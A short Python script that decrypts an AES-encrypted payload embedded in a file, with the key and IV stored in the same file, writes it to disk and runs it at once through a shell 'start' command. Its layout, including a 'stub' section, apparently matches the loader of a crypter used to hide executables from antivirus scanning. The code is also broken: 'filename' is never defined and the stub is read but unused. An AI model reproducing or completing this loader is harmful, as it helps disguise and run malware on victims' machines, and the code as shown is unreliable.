import os
import sys
from Crypto.Cipher import AES
import subprocess
from Crypto.Util.Padding import unpad

def decrypt():
    chunksize = AES.block_size*1024
    outputFile = os.path.join(os.path.dirname(os.path.abspath(__file__)), "decrypted"+os.path.basename(filename))

    with open(filename, 'rb') as infile:
        filesize = int(infile.read(16).decode('utf-8'))
        IV = infile.read(16)
        key = infile.read(32)
        filesizeSTUB = int(infile.read(16).decode('utf-8'))
        stub = infile.read(filesizeSTUB)

        decryptor = AES.new(key, AES.MODE_CBC, IV)

        with open(outputFile, 'wb') as outfile:
            while True:
                chunk = infile.read()

                if len(chunk) == 0:
                    break
                
                decrypted_chunk = decryptor.decrypt(chunk)
                unpadded_chunk = unpad(decrypted_chunk, AES.block_size)
                outfile.write(unpadded_chunk)

                # outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(filesize)

decrypt()

decrypted_file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "decrypted"+os.path.basename(filename))
subprocess.run(["start", "", decrypted_file_path], shell=True) #opens new cmd and runs file